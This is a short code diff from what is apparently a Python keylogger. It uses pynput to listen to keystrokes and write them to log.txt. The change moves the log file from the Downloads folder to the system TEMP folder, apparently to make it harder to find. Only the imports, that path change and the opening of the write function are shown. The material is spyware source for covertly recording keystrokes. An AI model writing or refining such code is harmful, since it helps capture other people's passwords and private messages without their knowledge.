@@ -1,9 +1,9 @@
 import os
 from pynput.keyboard import Key, Listener
 
-# Dynamically get the Downloads folder path
-downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
-log_file = os.path.join(downloads_path, "log.txt")
+# Get the system temp folder dynamically
+temp_path = os.path.join(os.environ["TEMP"])
+log_file = os.path.join(temp_path, "log.txt")
 
 def write_to_file(key):
     key = str(key).replace("'", "")  
